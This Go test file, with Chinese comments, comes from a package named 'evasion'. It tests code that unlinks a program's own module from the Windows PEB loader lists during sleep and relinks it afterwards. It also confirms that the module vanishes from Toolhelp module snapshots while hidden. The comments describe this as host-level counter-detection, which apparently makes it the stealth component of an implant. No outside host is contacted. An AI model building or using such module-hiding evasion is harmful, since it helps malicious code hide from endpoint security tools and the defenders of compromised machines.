//go:build windows && amd64

// 摘链是直接改加载器结构：写错一个指针，进程会在下一次 LoadLibrary /
// 枚举模块时崩掉，而且现场极难定位。因此这里用合成链表把三个纯函数钉死，
// 再对真实 PEB 做一次摘链/挂回往返。

package evasion

import (
	"os"
	"testing"
	"unsafe"

	"golang.org/x/sys/windows"
)

// allocTestPages 申请一块可读写内存来搭链表
func allocTestPages(t *testing.T, size uintptr) uintptr {
	t.Helper()
	p, err := windows.VirtualAlloc(0, size, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil || p == 0 {
		t.Fatalf("分配测试内存: %v", err)
	}
	t.Cleanup(func() { _ = windows.VirtualFree(p, 0, windows.MEM_RELEASE) })
	return p
}

// linkChain 把 head <-> entries... 串成双向链表（Links 偏移为 0）
func linkChain(head uintptr, entries ...uintptr) {
	prev := head
	for _, e := range entries {
		writePtr(prev, e)   // prev.Flink = e
		writePtr(e+8, prev) // e.Blink = prev
		prev = e
	}
	writePtr(prev, head)   // 尾.Flink = head
	writePtr(head+8, prev) // head.Blink = 尾
}

// readChain 从 head 出发把 Flink 链读成一个切片（含 head 结束）
func readChain(head uintptr) []uintptr {
	var out []uintptr
	cur := readPtr(head)
	for i := 0; i < 16 && cur != 0 && cur != head; i++ {
		out = append(out, cur)
		cur = readPtr(cur)
	}
	return out
}

// TestDetachThenAttachRestoresOriginalPosition 摘掉再挂回，必须回到原位
func TestDetachThenAttachRestoresOriginalPosition(t *testing.T) {
	buf := allocTestPages(t, 0x1000)
	head, e1, e2, e3 := buf, buf+0x100, buf+0x200, buf+0x300
	linkChain(head, e1, e2, e3)

	saved := detachLinks(e2)
	got := readChain(head)
	if len(got) != 2 || got[0] != e1 || got[1] != e3 {
		t.Fatalf("摘链后链表应为 [e1 e3]，实为 %v", got)
	}
	// 被摘节点自身也不该再指向链表内部（避免留下悬挂指针）
	pos, ok := attachLinks(saved, head)
	if !ok || pos != "原位" {
		t.Fatalf("挂回结果 pos=%q ok=%v，期望 原位/true", pos, ok)
	}
	got = readChain(head)
	if len(got) != 3 || got[0] != e1 || got[1] != e2 || got[2] != e3 {
		t.Fatalf("挂回后链表应为 [e1 e2 e3]，实为 %v", got)
	}
	// 反向链也要一致
	if readPtr(e3+8) != e2 || readPtr(e2+8) != e1 || readPtr(e1+8) != head {
		t.Fatal("Blink 链未恢复")
	}
}

// TestAttachFallsBackToTailWhenNeighborsChanged 邻居被别人改过（睡眠期 DLL 懒加载），
// 必须退化为挂到表尾，而不是硬写失效指针把链表接成环。
func TestAttachFallsBackToTailWhenNeighborsChanged(t *testing.T) {
	buf := allocTestPages(t, 0x1000)
	head, e1, e2, e3, e4 := buf, buf+0x100, buf+0x200, buf+0x300, buf+0x400
	linkChain(head, e1, e2, e3)

	saved := detachLinks(e2)
	// 模拟：睡眠期间 e4 被插到 e1 之后 —— e2 记住的邻居不再相邻
	writePtr(e1, e4)
	writePtr(e4+8, e1)
	writePtr(e4, e3)
	writePtr(e3+8, e4)

	pos, ok := attachLinks(saved, head)
	if !ok || pos != "表尾" {
		t.Fatalf("邻居变动时应挂到表尾，实为 pos=%q ok=%v", pos, ok)
	}
	got := readChain(head)
	last := got[len(got)-1]
	if last != e2 {
		t.Fatalf("挂到表尾后最后一个应为 e2，实为 %#x（链=%v）", last, got)
	}
	if readPtr(head+8) != e2 {
		t.Fatal("表头 Blink 未指向新尾节点")
	}
}

// TestFindSelfEntry 按 DllBase 在 InLoadOrder 链表里定位本模块
func TestFindSelfEntry(t *testing.T) {
	buf := allocTestPages(t, 0x2000)
	head := buf
	e1, e2, e3 := buf+0x100, buf+0x200, buf+0x300
	linkChain(head, e1, e2, e3)
	writePtr(e1+entryDllBase, 0x10000000)
	writePtr(e2+entryDllBase, 0x20000000)
	writePtr(e3+entryDllBase, 0x30000000)

	got, err := findSelfEntry(ldrList{head: head, offset: entryInLoadOrderLinks}, 0x20000000)
	if err != nil {
		t.Fatalf("查找失败: %v", err)
	}
	if got != e2 {
		t.Fatalf("找到 %#x，期望 %#x", got, e2)
	}
	if _, err := findSelfEntry(ldrList{head: head, offset: entryInLoadOrderLinks}, 0xDEAD); err == nil {
		t.Fatal("不存在的模块应报错")
	}
}

// TestFindSelfEntryStopsOnCycle 链表成环时不能死循环（防御性上限）
func TestFindSelfEntryStopsOnCycle(t *testing.T) {
	buf := allocTestPages(t, 0x1000)
	head, e1 := buf, buf+0x100
	writePtr(head, e1)
	writePtr(e1, e1) // 自环
	writePtr(e1+8, head)
	if _, err := findSelfEntry(ldrList{head: head, offset: entryInLoadOrderLinks}, 0xDEAD); err == nil {
		t.Fatal("自环链表应有上限并报错")
	}
}

// TestHideRestoreSelfModuleRoundTrip 真实 PEB 往返：
// 摘链后本模块从加载器链表消失（os.Executable 依赖它，正是"只在睡眠窗口内摘"的原因），
// 挂回后一切恢复。
func TestHideRestoreSelfModuleRoundTrip(t *testing.T) {
	before, err := os.Executable()
	if err != nil || before == "" {
		t.Fatalf("摘链前取自身路径失败: %v", err)
	}
	restore, err := HideSelfModule()
	if err != nil {
		t.Skipf("当前环境无法摘链（跳过）: %v", err)
	}
	if !SelfModuleHidden() {
		t.Fatal("摘链后 SelfModuleHidden 仍为 false")
	}
	// 摘链期间加载器看不到本模块 —— 这正是不能在命令执行路径上摘链的理由
	if _, err := os.Executable(); err == nil {
		t.Log("注意：摘链期间 os.Executable 仍成功（宿主实现可能不依赖加载器链表）")
	}
	restore()
	if SelfModuleHidden() {
		t.Fatal("挂回后 SelfModuleHidden 仍为 true")
	}
	after, err := os.Executable()
	if err != nil || after != before {
		t.Fatalf("挂回后取自身路径失败: %q (期望 %q, err=%v)", after, before, err)
	}
	// 幂等：重复挂回不应报错或再次改链表
	if err := RestoreSelfModule(); err != nil {
		t.Fatalf("重复挂回应是空操作: %v", err)
	}
}

// TestHideForSleepGate 门控：未开启主机层对抗时必须完全不动作
func TestHideForSleepGate(t *testing.T) {
	restore := HideForSleep(false)
	if SelfModuleHidden() {
		restore()
		t.Fatal("enabled=false 时不应该摘链")
	}
	restore() // 空操作，重复调用也不该 panic

	restore = HideForSleep(true)
	if !SelfModuleHidden() {
		t.Fatal("enabled=true 时应该摘链")
	}
	restore()
	if SelfModuleHidden() {
		t.Fatal("restore 后不应仍处于摘链状态")
	}
}

// moduleListed 用 Toolhelp 快照枚举模块，判断某个基址是否还在列表里。
// 快照走的就是加载器链表 —— 正是摘链要影响的那条路径。
func moduleListed(t *testing.T, base uintptr) bool {
	t.Helper()
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPMODULE, uint32(os.Getpid()))
	if err != nil {
		t.Skipf("创建模块快照失败: %v", err)
	}
	defer windows.CloseHandle(snap)
	var me windows.ModuleEntry32
	me.Size = uint32(unsafe.Sizeof(me))
	if err := windows.Module32First(snap, &me); err != nil {
		t.Skipf("枚举模块失败: %v", err)
	}
	for {
		if uintptr(unsafe.Pointer(me.ModBaseAddr)) == base {
			return true
		}
		if err := windows.Module32Next(snap, &me); err != nil {
			return false
		}
	}
}

// TestHideModuleDisappearsFromModuleList 外部证据：摘链期间 Toolhelp 快照里看不到本模块，
// 挂回后又出现。这条是"摘链到底有没有用"的直接判据。
func TestHideModuleDisappearsFromModuleList(t *testing.T) {
	base, err := selfImageBase()
	if err != nil {
		t.Fatalf("取本模块基址: %v", err)
	}
	if !moduleListed(t, base) {
		t.Fatalf("摘链前本模块应在模块列表里（base=0x%x）", base)
	}
	restore, err := HideSelfModule()
	if err != nil {
		t.Skipf("当前环境无法摘链（跳过）: %v", err)
	}
	listed := moduleListed(t, base)
	restore()
	if listed {
		t.Fatal("摘链后本模块仍能被 Toolhelp 枚举到 —— 摘链没有实际效果")
	}
	if !moduleListed(t, base) {
		t.Fatal("挂回后本模块应重新出现在模块列表里")
	}
}
